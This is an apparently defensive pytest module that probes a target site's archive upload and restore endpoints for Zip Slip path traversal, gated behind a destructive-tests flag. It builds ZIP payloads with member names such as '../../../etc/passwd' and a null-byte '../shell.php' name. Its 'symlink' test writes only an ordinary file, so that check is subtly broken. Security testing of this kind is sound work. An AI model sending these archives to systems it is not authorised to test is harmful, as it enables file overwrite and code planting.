# ⚠️ DESTRUCTIVE TEST — Do not run against production.
# Set ENABLE_DESTRUCTIVE_TESTS=True in tests/active/config.py to enable.
"""Category 39: Zip Slip and Archive Path Traversal Attacks."""
import zipfile
import io
import pytest

from tests.active.helpers import safe_post, url_join
from tests.active.config import ENABLE_DESTRUCTIVE_TESTS, TARGET_URL

if not ENABLE_DESTRUCTIVE_TESTS:
    pytestmark = pytest.mark.skip(
        reason="ENABLE_DESTRUCTIVE_TESTS=False in config.py — "
               "these tests modify server state, trigger lockouts, and may cause disruption."
    )

ARCHIVE_ENDPOINTS = [
    "/upload", "/import", "/restore", "/backup/restore",
    "/file/extract", "/archive/extract", "/api/import",
]


def _create_zip_with_traversal(filename):
    """Create a ZIP file with malicious member name."""
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w') as zf:
        zf.writestr(filename, b"malicious content")
    zip_buffer.seek(0)
    return zip_buffer


class TestZipSlipBasic:
    def test_zip_slip_directory_traversal(self):
        """Test basic Zip Slip vulnerability."""
        for endpoint in ARCHIVE_ENDPOINTS:
            zip_file = _create_zip_with_traversal("../../../etc/passwd")
            files = {"file": ("archive.zip", zip_file, "application/zip")}
            
            r = safe_post(url_join(endpoint),
                          files=files,
                          allow_redirects=False)
            if r and r.status_code in (200, 201):
                pytest.skip(
                    f"Zip Slip candidate at {endpoint}: "
                    "../../../ in member name accepted"
                )


class TestZipSlipAbsolutePath:
    def test_zip_slip_absolute_path(self):
        """Test Zip Slip via absolute path."""
        for endpoint in ARCHIVE_ENDPOINTS:
            zip_file = _create_zip_with_traversal("/etc/passwd")
            files = {"file": ("archive.zip", zip_file, "application/zip")}
            
            r = safe_post(url_join(endpoint),
                          files=files,
                          allow_redirects=False)
            if r and r.status_code in (200, 201):
                pytest.skip(
                    f"Absolute path Zip Slip at {endpoint}: "
                    "/etc/passwd member name accepted"
                )


class TestZipSlipDeepNesting:
    def test_zip_slip_deep_nesting(self):
        """Test Zip Slip with deeply nested traversal."""
        for endpoint in ARCHIVE_ENDPOINTS:
            traversal = "../" * 20 + "etc/passwd"
            zip_file = _create_zip_with_traversal(traversal)
            files = {"file": ("archive.zip", zip_file, "application/zip")}
            
            r = safe_post(url_join(endpoint),
                          files=files,
                          allow_redirects=False)
            if r and r.status_code in (200, 201):
                pytest.skip(
                    f"Deep nesting Zip Slip at {endpoint}: "
                    "deeply nested traversal accepted"
                )


class TestZipSlipNullByte:
    def test_zip_slip_null_byte(self):
        """Test Zip Slip with null byte bypass."""
        for endpoint in ARCHIVE_ENDPOINTS:
            zip_file = _create_zip_with_traversal("../shell.php\x00.txt")
            files = {"file": ("archive.zip", zip_file, "application/zip")}
            
            r = safe_post(url_join(endpoint),
                          files=files,
                          allow_redirects=False)
            if r and r.status_code in (200, 201):
                pytest.skip(
                    f"Null byte Zip Slip at {endpoint}: "
                    "null byte in member name accepted"
                )


class TestZipSlipSymlinks:
    def test_zip_slip_symlink_traversal(self):
        """Test Zip Slip via symlink creation."""
        for endpoint in ARCHIVE_ENDPOINTS:
            # Create a zip with a symlink
            zip_buffer = io.BytesIO()
            with zipfile.ZipFile(zip_buffer, 'w') as zf:
                # Symlink: link_name -> ../../../etc/passwd
                zf.writestr("link_to_passwd", "../../../etc/passwd")
            zip_buffer.seek(0)
            
            files = {"file": ("archive.zip", zip_buffer, "application/zip")}
            
            r = safe_post(url_join(endpoint),
                          files=files,
                          allow_redirects=False)
            if r and r.status_code in (200, 201):
                pytest.skip(
                    f"Symlink Zip Slip at {endpoint}: "
                    "symlink member name accepted"
                )


class TestZipSlipTarGz:
    def test_tar_gz_traversal(self):
        """Test Tar.gz archive traversal."""
        pytest.skip(
            "Tar.gz traversal testing requires tarfile module setup. "
            "Implement in destructive suite with tar handling."
        )


class TestZipSlipRar:
    def test_rar_archive_traversal(self):
        """Test RAR archive traversal."""
        pytest.skip(
            "RAR archive testing requires external tools. "
            "Test in destructive suite if target accepts RAR files."
        )


class TestZipSlipSkipped:
    def test_zip_slip_exploitation_verification_destructive(self):
        pytest.skip(
            "Zip Slip exploitation verification requires: "
            "1) File system access to verify extraction location "
            "2) Ability to read extracted files. "
            "Only test in destructive environment with full authorization."
        )
